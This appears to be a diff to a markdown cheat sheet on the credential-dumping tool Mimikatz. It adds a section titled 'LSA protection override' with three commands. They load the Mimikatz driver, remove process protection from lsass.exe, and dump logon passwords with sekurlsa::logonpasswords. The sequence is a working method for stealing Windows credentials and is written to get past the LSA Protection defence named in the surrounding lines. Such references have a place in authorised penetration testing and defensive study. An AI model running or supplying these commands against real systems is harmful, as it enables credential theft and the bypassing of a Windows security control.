@@ -115,6 +115,13 @@ Mimikatz is a powerful tool for extracting credentials from Windows systems. Bel
 - For `sekurlsa::*`, must have **SeDebugPrivilege**
 - **Credential Guard**, **LSA Protection**, or **AV/EDR** may prevent extraction
 
+## LSA protection override
+```plaintext
+!+
+!processprotect /process:lsass.exe /remove
+sekurlsa::logonpasswords
+```
+
 ---
 
 ## 📋 Summary Table
